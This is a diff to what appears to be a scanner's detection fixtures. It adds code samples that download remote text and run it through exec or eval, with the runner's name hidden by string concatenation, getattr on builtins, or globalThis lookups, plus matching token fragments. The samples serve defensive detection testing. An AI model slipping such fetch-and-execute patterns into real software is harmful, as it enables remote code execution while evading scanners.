@@ -247,7 +247,10 @@ RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t"
             "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob",
             # (0.1.8, the follower's adversarial pass) members by name and runners handed to a call
             "getattr(rq, 'get')(", "getattr(r, \"text\", None)", "['get'](", '["text"]', ".then(eval)",
-            ".then(vm.runInThisContext)", "res.on('data', eval)", ", Function)", "(exec)"]
+            ".then(vm.runInThisContext)", "res.on('data', eval)", ", Function)", "(exec)",
+            # (the detection round) getattr names the file builds, runners through the builtins or the global object
+            "getattr(builtins, N)(", "N = 'ex' + 'ec'\n", "N = 'ev'", " + 'al'", "getattr(__builtins__, 'ex' + ", "'ec')(",
+            "__builtins__.__dict__['eval'](", "globalThis.", "window.Function(", "global.eval(", "N += 'x'\n"]
 # the 0.1.7 signs (audit P0): hidden or fetching PowerShell, stager strings,
 # reverse shells, host information sent out, beacons to capture services,
 # credentials sent to a named service, a download run with Python
@@ -1519,6 +1522,17 @@ RECEIVED_CURATED = [
     "const code = `${await (await fetch(u)).text()}`;\neval(code);\n",
     "const code = `fetch(u).then(r => r.text()).then(t => console.log(t))`;\nspawn(process.execPath, ['-e', code]);\n",
     "x = rb'urlopen(u)' + f'{urlopen(u).read()}'\nexec(x)\n",
+    # (the detection round) getattr names the file builds; runners named through the builtins or the global object
+    "import requests, builtins\ngetattr(builtins, 'ex' + \"ec\")(requests.get(u).text)\n",
+    "import requests\nN = 'ev' + 'al'\ngetattr(__builtins__, N, None)(requests.get(u).text)\n",
+    "import requests\nH = 'ex'\ngetattr(__builtins__, H + 'ec')(requests.get(u).text)\n",
+    "import requests\nN = 'exec'\nN = 'print'\ngetattr(__builtins__, N)(requests.get(u).text)\n",
+    "import requests\nN = 'ex'\nN += 'ec'\ngetattr(__builtins__, N)(requests.get(u).text)\n",
+    "import requests\ndef f(n):\n    getattr(__builtins__, n)(requests.get(u).text)\n",
+    "import requests\ngetattr(__builtins__, 'ex' + 'e-c')(requests.get(u).text)\n",
+    "import requests\n__builtins__.__dict__['exec'](requests.get(u).text)\nbuiltins.execute(requests.get(u).text)\n",
+    "fetch(u).then((r) => r.text()).then((c) => globalThis['eval'](c));\nwindow.Function(x)();\nmyglobal.eval(c);\n",
+    "const N = 'ev' + 'al'; const M = 'x';\nN = 1;\ngetattr(o, N + M, getattr(p, \"q\" + M))(u)\n",
 ]
 
 
